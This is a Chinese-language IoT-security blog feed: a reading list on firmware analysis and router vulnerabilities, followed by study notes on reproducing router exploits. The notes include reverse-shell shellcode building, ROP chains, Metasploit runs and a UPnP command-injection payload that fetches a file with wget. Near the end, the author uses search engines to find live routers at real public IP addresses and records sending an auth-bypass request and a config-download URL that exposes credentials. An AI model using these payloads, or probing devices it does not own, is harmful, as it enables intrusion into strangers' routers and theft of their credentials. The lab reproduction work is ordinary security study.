<li>American Fuzzy Lop使用：<a href="http://galaxylab.pingan.com.cn/afl使用101/" target="_blank" rel="noopener">http://galaxylab.pingan.com.cn/afl使用101/</a></li>
<li>openwrt cross compile环境：<a href="https://archive.openwrt.org/barrier_breaker/14.07/" target="_blank" rel="noopener">https://archive.openwrt.org/barrier_breaker/14.07/</a></li>
<li>总结：反编译lua脚本：<a href="http://blog.sina.com.cn/s/blog_53fdf1590102yhfe.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_53fdf1590102yhfe.html</a></li>
</ul>
<h1 id="02-type"><a href="#02-type" class="headerlink" title="02-type"></a>02-type</h1><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><ul>
<li>IoT漏洞研究（一）固件基础</li>
<li>[翻译]IoT设备固件分析教程之固件是怎么存储的-智能设备-看雪论坛</li>
<li>Breaking the D-Link DIR3060 Firmware Encryption - Recon - Part 1</li>
</ul>
<h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><ul>
<li>[原创]看雪2018峰会回顾_智能设备漏洞挖掘中几个突破点(内有十种固件提取方法和首次公开uboot提取固件方法)-智能设备-看雪论坛</li>
<li>那些常见的固件提取手段</li>
<li>免拆芯片提取固件</li>
<li>利用UART串口调试提取360路由器固件</li>
<li>从PR中学习如何修改 flashrom 读取国产 flash</li>
<li>Flash Dump技术解析</li>
<li>[原创]iot初体验-智能设备-看雪论坛</li>
<li>[原创]摄像头逆向分析之旅-智能设备-看雪论坛</li>
<li>Restoring the original Buffalo firmware on the WBMR-HP-G300H</li>
</ul>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
<li>TP-Link wr886nv6 固件解析</li>
<li>Reverse Engineering VxWorks Firmware: WRT54Gv8 – /dev/ttyS0</li>
<li>IoT漏洞研究（一）固件基础-固件分析部分</li>
<li>ARM设备固件装载基址定位的研究_朱瑞瑾</li>
<li>ARM固件加载基址</li>
<li>[分享]一次嵌入式固件逆向实践-智能设备-看雪论坛</li>
<li>原创 | 固件安全之加载地址分析</li>
<li>原创 | TP-LINK WDR 7660 VxWorks系统分析</li>
</ul>
<h3 id="重打包"><a href="#重打包" class="headerlink" title="重打包"></a>重打包</h3><ul>
<li>rpmrebuild 提取spec重新打包rpm示例</li>
<li>netgear固件格式分析及后门植入重打包</li>
<li>Netgear固件分析与后门植入</li>
<li>路由器篡改固件添加后门 - FreeBuf网络安全行业门户</li>
<li>复现｜摄像头固件重打包</li>
</ul>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><ul>
<li>加密固件之依据老固件进行解密</li>
<li>Linksys EA6100 固件解密分析</li>
</ul>
<h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><ul>
<li>物联网设备的几种固件仿真方式</li>
</ul>
<h2 id="设备分析"><a href="#设备分析" class="headerlink" title="设备分析"></a>设备分析</h2><ul>
<li>通过设备UART接口调试获取shell - FreeBuf网络安全行业门户</li>
<li>[胖猴小玩闹]系列-19篇</li>
<li>【漏洞分析】从零开始pwn掉一台古董路由器</li>
<li>手环BLE蓝牙认证绕过，可实现远程控制</li>
<li>NetGear 夜鹰 RAX40V2 设备与固件分析<h2 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h2></li>
<li>物联网安全之MQTT协议安全</li>
<li>物联网安全之MQTT渗透实战</li>
</ul>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><ul>
<li>IoT设备逆向工程中的函数识别 – 绿盟科技技术博客</li>
<li>BinDiff二进制比较简介</li>
</ul>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><ul>
<li>G.O.S.S.I.P 学术论文推荐 20204-26</li>
<li>原创 | 来自 Bitdefender 的IoT漏洞研究分享</li>
<li>在IoT设备中查找端口对应进程的四种方法</li>
<li>Whitepaper-Router_Vulnerability_Present_for_a_Decade</li>
</ul>
<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><ul>
<li>Netgear R6220 认证绕过漏洞分析</li>
<li>[原创]DLink路由器固件的一次分析记录-智能设备-看雪论坛</li>
<li>复现｜路由器命令执行</li>
<li>记一次网关设备的pwn-智能设备-看雪论坛</li>
<li>『P2P僵尸网络漏洞研究——mozi』 netgear路由器漏洞复现</li>
<li>原创 | 漏洞组合拳劫持门禁控制系统</li>
<li>D-Link DIR 3040 从信息泄露到 RCE</li>
<li>CVE-20233514：Netgear 多款交换机命令注入漏洞</li>
<li>僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现</li>
<li>复现影响79款Netgear路由器高危漏洞</li>
<li>[原创]D-Link DIR-645路由器栈溢出漏洞分析-看雪论坛</li>
<li>实战逻辑漏洞：三个漏洞搞定一台路由器</li>
<li>vivetok 摄像头远程栈溢出漏洞分析</li>
<li>CVE-2021-20090（华硕DSL-AC3100）身份验证绕过漏洞分析</li>
<li>CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析</li>
<li>CVE-2020-24581 D-Link DSL-2888A 远程命令执行漏洞分析</li>
<li>NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</li>
<li>微软发现新的 NETGEAR 固件漏洞，可能会导致身份盗用和整个系统受损<h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2></li>
<li>IoT 设备固件分析之网络协议 fuzz</li>
<li>浅谈固件Fuzz</li>
</ul>
<h2 id="p-code"><a href="#p-code" class="headerlink" title="p-code"></a>p-code</h2><ul>
<li>使用Ghidra P-Code进行辅助逆向分析</li>
<li>Working With Ghidra’s P-Code To Identify Vulnerable Function Calls by Alexei Bulazel</li>
</ul>
<h2 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h2><ul>
<li>Patch Diffing a Cisco RV110W Firmware Update (Part II)</li>
<li>Patch Diffing with Ghidra</li>
</ul>
<h2 id="car"><a href="#car" class="headerlink" title="car"></a>car</h2><ul>
<li>『IOT』车联网安全之CAN协议浅谈</li>
</ul>
<h2 id="nonTech"><a href="#nonTech" class="headerlink" title="nonTech"></a>nonTech</h2><ul>
<li>2018 年 IoT 那些事儿</li>
</ul>
<h2 id="indus"><a href="#indus" class="headerlink" title="indus"></a>indus</h2><ul>
<li>原创 | 从研究工控设备到发现供应链威胁</li>
</ul>
<h1 id="03-tool"><a href="#03-tool" class="headerlink" title="03-tool"></a>03-tool</h1><ul>
<li>固件解密<ul>
<li>buffalo-enc</li>
</ul>
</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT安全-文章学习笔记-1</title>
    <url>/2020/04/17/iot/IOT%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="IOT安全-文章学习笔记-1"><a href="#IOT安全-文章学习笔记-1" class="headerlink" title="IOT安全-文章学习笔记-1"></a>IOT安全-文章学习笔记-1</h1><h2 id="路由器漏洞挖掘之栈溢出入门（二）"><a href="#路由器漏洞挖掘之栈溢出入门（二）" class="headerlink" title="路由器漏洞挖掘之栈溢出入门（二）"></a>路由器漏洞挖掘之栈溢出入门（二）</h2><p><a href="https://www.anquanke.com/post/id/171918" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171918</a></p>
<ul>
<li>python写入16进制数据时，要加\x，即”\x12\x34”</li>
<li>cat test时，要用双引号扩起来，即”<code>cat test</code>“</li>
<li>gdb中vmmap找基地址，同一个libc出现多次，基地址看第一个（属性为rwxp的）</li>
</ul>
<h2 id="路由器漏洞挖掘之栈溢出入门（三）ROP链的构造"><a href="#路由器漏洞挖掘之栈溢出入门（三）ROP链的构造" class="headerlink" title="路由器漏洞挖掘之栈溢出入门（三）ROP链的构造"></a>路由器漏洞挖掘之栈溢出入门（三）ROP链的构造</h2><p><a href="https://www.anquanke.com/post/id/172126" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172126</a></p>
<ul>
<li>sleep(1)的作用、rop链的构造</li>
<li>patternLocOffset.py -l 500，实际生成1500</li>
<li>qemu test “<code>cyclic 1500</code>“形式，gdb中得到0x66616163，然后cyclic -l 0x66616163得偏移508</li>
<li>在 gdb 调试中找到 libc 的基地址。（vmmap 或者 i proc mappings+PID），后者试验失败</li>
<li>pwntools生成填充文件，用python2运行，py3出错</li>
<li>可用的shellcode：<a href="http://shell-storm.org/shellcode/files/shellcode-792.php" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/shellcode-792.php</a></li>
<li>最后的exp即py脚本，要\x加\，且payload最开始前加一行payload = “”</li>
</ul>
<h2 id="一步一步PWN路由器之rop技术实战"><a href="#一步一步PWN路由器之rop技术实战" class="headerlink" title="一步一步PWN路由器之rop技术实战"></a>一步一步PWN路由器之rop技术实战</h2><p><a href="https://xz.aliyun.com/t/1511（" target="_blank" rel="noopener">https://xz.aliyun.com/t/1511（</a></p>
<ul>
<li>python命令行中使用cyclic：cyclic()、cyclic_find()</li>
<li>在 uclibc 的 scandir 或者 scandir64 的函数末尾有一个gadgets 可以操控几乎所有寄存器</li>
</ul>
<h2 id="一步一步PWN路由器之路由器环境修复-amp-amp-rop技术分析"><a href="#一步一步PWN路由器之路由器环境修复-amp-amp-rop技术分析" class="headerlink" title="一步一步PWN路由器之路由器环境修复&amp;&amp;rop技术分析"></a>一步一步PWN路由器之路由器环境修复&amp;&amp;rop技术分析</h2><p><a href="https://xz.aliyun.com/t/1509（" target="_blank" rel="noopener">https://xz.aliyun.com/t/1509（</a></p>
<ul>
<li>cat /proc/进程ID/maps ｜ grep libc，看加载了哪些lib文件（只能看有哪些，基址好像不对</li>
</ul>
<h2 id="路由器漏洞挖掘之栈溢出——反弹shell的payload构造"><a href="#路由器漏洞挖掘之栈溢出——反弹shell的payload构造" class="headerlink" title="路由器漏洞挖掘之栈溢出——反弹shell的payload构造"></a>路由器漏洞挖掘之栈溢出——反弹shell的payload构造</h2><p><a href="https://www.anquanke.com/post/id/173362" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173362</a></p>
<ul>
<li>gdb-multiarch远程调试，如果是本机，则可省略127的IP，即target remote:1234</li>
<li>调试端口1234，传参端口1111，gdb连接1234，nc连接1111</li>
<li>可以用pwntools中的cyclic替代patterLocOffset，cyclic可直接在命令行中使用，如cyclic 200，但是py2的好像不支持，先卸载py3的pwntools再重新安装，这样，cyclic时就会使用py3的，就可以直接跟数字，而py2中这样的语法错误</li>
<li>py命令行中使用cyclic：cyclic(1000)、cyclic_find(0x61616e61)（直接在命令行中使用：cyclic 1000、cyclic -l 0x61616e61，按理是这样，但后一条报错，保险起见，还是py命令行中用（应该将0x61616e61转为字符串</li>
<li>最后的exp即py脚本，要\x加\</li>
<li>反弹shell的shellcode，<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/shellcode-860.php</a></li>
<li>py中hex函数将10转16：192.168.156.212得到：0xc0、a8、9c、d4；</li>
<li>因为是小端，所以IP是：0xd49ca8c0，最终汇编语句：li $a1,0xd49ca8c0</li>
<li>利用pwntool将汇编指令转为二进制指令：from pwn import *、context.arch=“mips”（还有bits和endian字段，默认是32和little）、asm(“li $a1,0xd49ca8c0”)<br><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-07-091720.png" alt></li>
<li>根据提示，下载binutils，<a href="http://docs.pwntools.com/en/stable/install/binutils.html，将$ARCH改为目标mips即可" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/install/binutils.html，将$ARCH改为目标mips即可</a></li>
<li>asm(“li $a1,0xd49ca8c0”)得到b’{\x9e\x05&lt;\xc0\xa8\xa54’（py2中无b</li>
<li>asm(“li $a1,0xd49ca8c0”).encode(‘hex’)得’9cd4053cc0a8a534’（py3中失败，因为python3中，编码的时候区分了字符串和二进制</li>
<li>反弹shell的shellcode中，stg3_SC的第七行，前四后四不变，中间8个改为“\x9c\xd4\x05\x3c\xc0\xa8\xa5\x34”，即\xf8\xff\xa5\xaf\x9c\xd4\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf</li>
<li>./qemu-mipsel -L . pwnable/ShellCode_Required/socket_bof 1111（运行目标）、nc -nvlp 31337（监听端口等待反弹shell）、python socket_bof_exp2.py（exp）</li>
</ul>
<h2 id="路由器漏洞挖掘之-DIR-805L-越权文件读取漏洞分析（应该是850"><a href="#路由器漏洞挖掘之-DIR-805L-越权文件读取漏洞分析（应该是850" class="headerlink" title="路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析（应该是850"></a>路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析（应该是850</h2><p><a href="https://www.anquanke.com/post/id/175625：" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175625：</a></p>
<ul>
<li><p>ssh本地端口转发：mac：ssh -L 9000:192.168.0.1:80 <a href="mailto:lxl@192.168.156.212" target="_blank" rel="noopener">lxl@192.168.156.212</a>，随后Safari访问127.0.0.1:9000即可访问到路由器页面（9000本地端口，192.168.0.1:80路由器页面内网IP端口，192.168.156.212mac可连接的跳板IP</p>
</li>
<li><p>mac中msf实施攻击，一直失败，断定是各种端口代理的缘故，待解决（怎么通过ssh端口转发解决？</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-09-020432.png" alt></p>
</li>
<li><p>静态分析：实际与文章不符，暂且搁置</p>
</li>
<li><p>burp中发送payload尝试复现，也失败</p>
</li>
</ul>
<h2 id="路由器漏洞挖掘之-DIR-850-645-命令执行漏洞复现"><a href="#路由器漏洞挖掘之-DIR-850-645-命令执行漏洞复现" class="headerlink" title="路由器漏洞挖掘之 DIR-850/645 命令执行漏洞复现"></a>路由器漏洞挖掘之 DIR-850/645 命令执行漏洞复现</h2><p><a href="https://www.cnblogs.com/H4lo/p/10996949.html：" target="_blank" rel="noopener">https://www.cnblogs.com/H4lo/p/10996949.html：</a></p>
<ul>
<li><p>Ubuntu中安装msf，漏洞利用成功：set rhosts 192.168.0.1、set lhost 192.168.0.2、exploit</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-09-024251.png" alt></p>
</li>
</ul>
<h2 id="通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃"><a href="#通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃" class="headerlink" title="通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃"></a>通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃</h2><p><a href="https://www.freebuf.com/vuls/160040.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/160040.html</a></p>
<ul>
<li>其他分析文章中下载固件：<a href="https://xz.aliyun.com/t/4819、https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar" target="_blank" rel="noopener">https://xz.aliyun.com/t/4819、https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar</a></li>
<li>find搜索文件名：find . -name “ctrlt”</li>
<li>grep搜索文件内容：grep -r “ctrlt” .（找到bin/upnp文件、-r遍历目录用的</li>
<li>向mips虚拟机中传文件：tar -zcvf 1 squashfs-root/、scp 1 <a href="mailto:root@10.10.11.2" target="_blank" rel="noopener">root@10.10.11.2</a>:/root、虚拟机中tar -zxvf 1即可</li>
<li>chroot squashfs-root/ sh：虚拟机中直接运行upnp失败，提示没有文件，应该是缺少so文件，应该chroot后运行sh后再运行他</li>
<li>scp连接时出错，Host key verification failed：ssh-keygen -R 你要访问的IP地址</li>
<li>chroot后，就以固件的文件系统为根目录了，原来一些系统命令就不可使用了，比如netstat观察端口，为此，chroot进入前再打开一个mips虚拟机命令行窗口，或者Ubuntu中ssh连接qemu-mips（多个终端：macOs、Ubuntu、qemu-mips、squashfs-root启动后的sh，注意区分</li>
<li>chroot后打开sh，一旦运行mic，原ssh连接就卡了，发现ping也不通，sh中ctrl+c后ifconfig，发现eth0网卡都没有了，且出现一个br0网卡，应该是mic程序也有网卡的操作，与之前相矛盾了（重新设置eth0网卡的IP后，再运行mic，eth0就会没有，ssh自然就卡了，怎么解决？</li>
<li>尝试一下本文的qemu-mips搭建方法，结合<a href="https://xz.aliyun.com/t/4130，测试还是失败" target="_blank" rel="noopener">https://xz.aliyun.com/t/4130，测试还是失败</a></li>
<li>tunctl tap0的方法至少能让虚拟机启动起来（但是启动mic时导致错误），修改qemu-ifup脚本的方法启动都困难，总之，复现失败，来日再战</li>
</ul>
<h2 id="CVE-2017-17215-HG532命令注入漏洞分析"><a href="#CVE-2017-17215-HG532命令注入漏洞分析" class="headerlink" title="CVE-2017-17215-HG532命令注入漏洞分析"></a>CVE-2017-17215-HG532命令注入漏洞分析</h2><p><a href="https://xz.aliyun.com/t/4819" target="_blank" rel="noopener">https://xz.aliyun.com/t/4819</a></p>
<ul>
<li><p>漏洞利用的是upnp服务存在的注入漏洞实现任意命令执行</p>
</li>
<li><p>py的requests模块http请求</p>
</li>
<li><p>找漏洞所在点：公开信息得知upnp服务、根据poc中特征字符串</p>
</li>
<li><p>grep -r ”123“，搜寻内容</p>
</li>
<li><p>Ghidra 中漏洞函数伪代码（重命名后</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-11-082532.png" alt></p>
</li>
<li><p>poc中关键点：</p>
<p>  <code>&lt;NewStatusURL&gt;;/bin/busybox wget -g 172.16.16.17 -l /tmp/1 -r /1;&lt;/NewStatusURL&gt;</code></p>
<p>  <code>&lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</code></p>
</li>
<li><p>拼接后的buffer：<code>upg -g -U HUAWEIUPNP -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r ;/bin/busybox wget -g 172.16.16.17 -l /tmp/1 -r /1; -d -</code>、</p>
</li>
<li><p>system执行buffer中的命令，遇到分号截断后，自然就可任意代码执行</p>
</li>
<li><p>netstat -l 查看哪些端口处于监听模式</p>
</li>
<li><p>监听端口，可以用nc，也可用python中的simpleServer模块指定端口就可</p>
</li>
<li><p>同10，复现失败</p>
</li>
</ul>
<h2 id="路由器漏洞复现分析第二弹：CNVD-2018-01084"><a href="#路由器漏洞复现分析第二弹：CNVD-2018-01084" class="headerlink" title="路由器漏洞复现分析第二弹：CNVD-2018-01084"></a>路由器漏洞复现分析第二弹：CNVD-2018-01084</h2><p><a href="https://www.freebuf.com/vuls/162627.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/162627.html</a></p>
<ul>
<li>IDA打开Cgibin看一下main函数，如果要运行到处理service.cgi函数的分支，需要将一个参数设为相应的字符串（即字符串“service.cgi”对应servicecgi_main函数</li>
<li>需要用qemu -0 的方式来指定参数第一个参数：chroot. ./qemu  -0 “service.cgi” ./htdocs/cgibin.</li>
<li>servicecgi_main里面及其子函数cgibin_parse_request里面会取环境变量,如果不配置相应的环境变量那么cgibin运行后会直接走到http 解析失败的分支。因此在执行cgibin时还需要加入如下的环境变量，-E指定，-E REQUEST_METHOD=”POST”</li>
<li>CGI中一般通过getenv或stdlib库函数getenv来获得环境变量获取post过来的数据<ul>
<li>在cgibin中未找到stdin,scanf这样的函数或者字符串,因此把要注入的命令当做输入参数传递不能成功，</li>
<li>仔细检查每一个genenv,把要注入的命令放到request_uri环境变量时候成功</li>
</ul>
</li>
<li>问题：IDA hex窗口中，g跳往某地址失败，显示：Command “JumpAsk” failed，why？（重启ida解决，但是每次ctrl+F2重新调试都会出现此问题</li>
<li>验证cookie的sess_ispoweruser函数,直接修改了返回值v0过掉：右键-modify value，将0改为1，手动修改返回值来改变程序执行流程（注意，为方便测试，后续都需要这样</li>
<li>qemu使用-strace参数，让程序输出更多的调试信息，可以看到此时的系统调用</li>
<li>qemu2.5 user模式并未实现execve函数，需要下载带补丁版本的qemu2.9版本并调加-evecve参数</li>
<li>（Ubuntu18.04中qemu是2.11版本，也不支持execve，暂且搁置，以后需求多了再说</li>
</ul>
<h2 id="路由器漏洞复现分析第三弹：DVRF-INTRO题目分析"><a href="#路由器漏洞复现分析第三弹：DVRF-INTRO题目分析" class="headerlink" title="路由器漏洞复现分析第三弹：DVRF INTRO题目分析"></a>路由器漏洞复现分析第三弹：DVRF INTRO题目分析</h2><p><a href="https://www.freebuf.com/articles/wireless/163823.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/163823.html</a></p>
<p>第一个题目stack_bof_01</p>
<ul>
<li>echo -e ‘\x50\x09\x40’：-e参数，可打印对应ascii码的字符</li>
<li>偏移 = 目的字符串所在栈中位置 - ra在栈中位置 = 204</li>
<li>Mips中函数的调用通常是jalr t9格式，因此t9保存的是函数的地址，因为我们是直接通过jr ra过来的，所以此处的t9值并不是函数地址因此会出错。<ul>
<li>我们需要找一个gadget让t9中保存函数的起始地址 。</li>
<li>找到：<code>lw $t9,arg_0($sp)、jalr $t9</code></li>
</ul>
</li>
<li>此时要先找到libc的基地址，进入任意一个libc的提供的函数，列如memset：<ul>
<li>找到memset函数的起始地址（绝对地址）：</li>
<li>再用看下ida中memset的偏移：</li>
<li>那么 libc_base=绝对地址 - 偏移</li>
</ul>
</li>
<li>最终exp：<ul>
<li>204偏移 + gadget地址（ra所在） + dat_shell地址（jr ra后栈顶元素）</li>
<li>jr ra：跳到gadget，其将栈顶元素给t9并跳过去</li>
<li>jr ra后，栈顶元素就是dat_shell</li>
</ul>
</li>
</ul>
<p>第二个题目 uaf_01</p>
<ul>
<li>Free掉第一个变量后，前四个字节变为00，后面不变</li>
<li>此时再按输入的参数长度分配第二块内存,如果输入的参数长度不够长,那么就在free掉的第一块内存里取一块。<ul>
<li>啥意思？？？</li>
</ul>
</li>
<li>当参数长度大于等于13时,第二次malloc的内存是第一次malloc的地址,走到正确分支。<ul>
<li>13怎么来的，为什么12不行13就行？</li>
</ul>
</li>
</ul>
<h2 id="路由器漏洞复现分析第四弹：CVE-2018-7034"><a href="#路由器漏洞复现分析第四弹：CVE-2018-7034" class="headerlink" title="路由器漏洞复现分析第四弹：CVE-2018-7034"></a>路由器漏洞复现分析第四弹：CVE-2018-7034</h2><p><a href="https://www.freebuf.com/articles/wireless/165716.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/165716.html</a></p>
<ul>
<li>从zoomeye中搜索并测试<ul>
<li>curl -d “SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1” <a href="http://86.110.35.60:50000/getcfg.php（原文引号有误" target="_blank" rel="noopener">http://86.110.35.60:50000/getcfg.php（原文引号有误</a></li>
<li>要带上端口号</li>
<li>-d，data，发送post数据</li>
</ul>
</li>
<li>雷同：<a href="https://xz.aliyun.com/t/6453" target="_blank" rel="noopener">https://xz.aliyun.com/t/6453</a></li>
</ul>
<h2 id="D-Link系列路由器漏洞挖掘入门"><a href="#D-Link系列路由器漏洞挖掘入门" class="headerlink" title="D-Link系列路由器漏洞挖掘入门"></a>D-Link系列路由器漏洞挖掘入门</h2><p><a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">https://paper.seebug.org/429/</a></p>
<ul>
<li>继续往下看 <code>$result = &quot;OK&quot;;</code>无论是否执行成功，这里都会显示OK。所以这是一个盲注的命令执行。</li>
<li>因为是盲注的命令执行，所以这里需要借助一个盲打平台（如：<a href="http://ceye.io/" target="_blank" rel="noopener">ceye</a>），来验证漏洞是否存在</li>
<li>CEYE平台的使用：<a href="https://www.cnblogs.com/zhaijiahui/p/9160913.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/9160913.html</a></li>
</ul>
<hr>
<ul>
<li>已经禁止了<code>$REQUIRE_FILE</code>的参数为<code>var/etc/httpasswd</code>和<code>var/etc/hnapasswd</code>。这么一看无法获取账号密码。</li>
<li>但是我们可以从根路径开始配置<code>httpasswd</code>的路径，就可以绕过这个过滤了。</li>
<li>设置<code>REQUIRE_FILE=/var/etc/httpasswd</code> 成功绕过</li>
</ul>
<hr>
<ul>
<li>默认情况下，Web界面中的所有页面都需要进行身份验证，但是某些页面（如 登录页面） 必须在认证之前访问。 </li>
<li>为了让这些页面不进行认证，他们设置了一个PHP变量NO_NEED_AUTH：</li>
<li>如果我们把<code>$NO_NEED_AUTH</code>值 设置为 1 那就绕过了认证进行任意操作。</li>
<li>这里<code>AUTH_GROUP=0</code> 表示admin权限</li>
</ul>
<hr>
<ul>
<li>可以读取存储此设备信息的<code>DEVICE.ACCOUNT.xml.php</code>文件。</li>
</ul>
<h2 id="路由器0day漏洞挖掘实战"><a href="#路由器0day漏洞挖掘实战" class="headerlink" title="路由器0day漏洞挖掘实战"></a>路由器0day漏洞挖掘实战</h2><p><a href="https://www.anquanke.com/post/id/180714" target="_blank" rel="noopener">https://www.anquanke.com/post/id/180714</a></p>
<ul>
<li><p>MIPS IDAPYTHON审计辅助脚本：<a href="https://github.com/giantbranch/mipsAudit" target="_blank" rel="noopener">https://github.com/giantbranch/mipsAudit</a></p>
</li>
<li><p>简介</p>
<ul>
<li>路由器基本都是阉割版的linux系统</li>
<li>架构以MIPS和ARM为主</li>
<li>一般含有telnet服务</li>
<li>很多基础命令以busybox的方式实现（如cat，chmod，date，echo，ifconfig，ls，kill等）</li>
</ul>
</li>
<li><p>路由器常见漏洞</p>
<ul>
<li>Web漏洞：XSS、CSRF</li>
<li>二进制漏洞：主要是栈溢出</li>
<li>自带后门：如磊科路由器后门：私有协议，硬编码密码的后门</li>
</ul>
</li>
<li><p>总览</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-26-134232.jpg" alt="image-20200525111614382"></p>
</li>
<li><p>固件提取</p>
<ul>
<li>对智能硬件（路由器）的升级进行抓包，提取url</li>
<li>通过烧录器读取拆卸下来的芯片</li>
<li>通过mtd的方式：cat /proc/mtd查看分区信息、一般别人用dd命令来提取，其实用cp和cat也可以（用mtd 查看系统分区、备份恢复固件和刷新固件：<a href="http://blog.chinaunix.net/uid-28790518-id-5082378.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-28790518-id-5082378.html</a></li>
<li>通过串口的方式：假如串口可以获得shell，那么可以使用第三种方法即mtd法（参考book 16.2</li>
</ul>
</li>
<li><p>审计web源码，发现有些目录（下面的goform）不存在，代码在二进制中实现，故使用黑盒测试</p>
<ul>
<li>输入框中找xss</li>
<li>找自带的功能，如命令执行</li>
<li>burp测试</li>
</ul>
</li>
<li><p><strong>其实跑出来的量还是很大的，我只不过是偶然的机会遇到了刚好又漏洞的</strong>（敏感函数如strcat和sprintf</p>
</li>
<li>发现后面goahead的pid都变了，那应该溢出崩溃重启了；上gdb调试确认溢出</li>
<li>动态调试：<ul>
<li>1-基于qemu（qemu模拟</li>
<li>2-在设备上调试（qemu虚拟机</li>
</ul>
</li>
<li>qemu有两种运作模式<ul>
<li>用户模式（User mode），启动不同架构的Linux程序（如模拟一个mips程序</li>
<li>系统模式（System mode），模拟整个电脑系统（如启动一个qume-mips虚拟机</li>
</ul>
</li>
<li>注：有些程序比较依赖于特定的函数（比如nvram系列函数）就很难用qemu启动了</li>
<li>将对应的qemu程序及其依赖库拷贝到对应目录，<ul>
<li>ldd查看依赖库、mkdir/cp拷贝文件</li>
<li>使用静态的就没这烦恼了，如qemu-mips-static</li>
</ul>
</li>
<li>在设备上调试，条件：<ul>
<li>有shell权限（比如能ssh访问到</li>
<li>有静态编译的gdbserver或者gdb（gdbserver attach进程号、gdb-multiarch来连接</li>
</ul>
</li>
</ul>
<h2 id="tenda某路由器信息泄露查找"><a href="#tenda某路由器信息泄露查找" class="headerlink" title="tenda某路由器信息泄露查找"></a>tenda某路由器信息泄露查找</h2><p><a href="https://bbs.ichunqiu.com/thread-32773-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-32773-1-1.html</a></p>
<ul>
<li>搜索并下载：<a href="https://www.tenda.com.cn/search/n150.html" target="_blank" rel="noopener">https://www.tenda.com.cn/search/n150.html</a></li>
<li>binwalk对trx提取文件后，得到1C，再次对1C进行提取（-Me提取文件也没报错啊，但是就是没有_1C这样提取后的目录</li>
<li><p>提取后的每一个文件都是data，并不是我们已知的类型</p>
<ul>
<li>查看具体的一个xml文件看一下，可以看到这并不是一个正常的xml文件，其中还混杂这其它二进制数据，</li>
<li>应该是binwalk在处理xml或者html这类文件时，无法像其它文件一样通过文件头来确定整个文件的大小</li>
</ul>
</li>
<li><p>采用最简单的方法，通过正则查找脚本语言相关的代码段进行分析</p>
<ul>
<li>使用strings命令将解压后的1C字符串输出到文本：strings 1C &gt; tenda.txt</li>
<li>对应的这款tenda路由器使用asp脚本语言，我们可以通过查找&lt;%xx%&gt;这样的asp代码片段：grep -e “&lt;%.*%&gt;” tenda.txt</li>
<li>查找tenda路由器中的cgi处理程序，是否有一些隐藏的链接：grep -e “cgi” tenda.txt</li>
</ul>
</li>
<li>查找cgi获取到的信息：/cgi-bin/upgrade、/cgi-bin/DownloadCfg/RouterCfm.cfg、/cgi-bin/UploadCfg，由名字就猜到功能</li>
<li><p>测试</p>
<ul>
<li>直接访问/cgi-bin/DownloadCfg/RouterCfm.cfg，是否能下载路由器的配置文件</li>
<li>成功下载路由器的配置文件，文件中包含拨号连接的账号信息（搜索passwd</li>
</ul>
</li>
<li><p>现网案例查找</p>
<ul>
<li>在路由器页面里面，我们可以通过js的一些特征作为搜索关键字：body=def_want（这个特征是怎么来的？ </li>
<li>fofa（shodan、zoomeye</li>
<li><a href="http://39.84.48.228:82/index.asp/cgi-bin/DownloadCfg/RouterCfm.cfg" target="_blank" rel="noopener">http://39.84.48.228:82/index.asp/cgi-bin/DownloadCfg/RouterCfm.cfg</a></li>
